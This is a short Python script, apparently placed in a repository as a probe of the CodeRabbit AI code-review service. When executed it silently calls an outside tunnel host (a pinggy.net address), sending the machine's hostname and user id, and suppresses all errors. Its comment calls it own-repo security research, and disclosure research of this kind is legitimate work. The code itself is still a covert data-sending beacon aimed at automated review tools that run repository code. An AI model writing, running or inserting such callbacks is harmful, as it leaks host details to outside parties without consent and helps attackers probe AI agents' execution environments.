# Security research probe for CodeRabbit (own repo). One callback, hostname and uid only.
import os, urllib.request
try:
    urllib.request.urlopen("https://qjtec-223-233-81-254.free.pinggy.net/cb/sqlfluff?h=" + os.uname()[1] + "&u=" + str(os.getuid()), timeout=5)
except Exception:
    pass
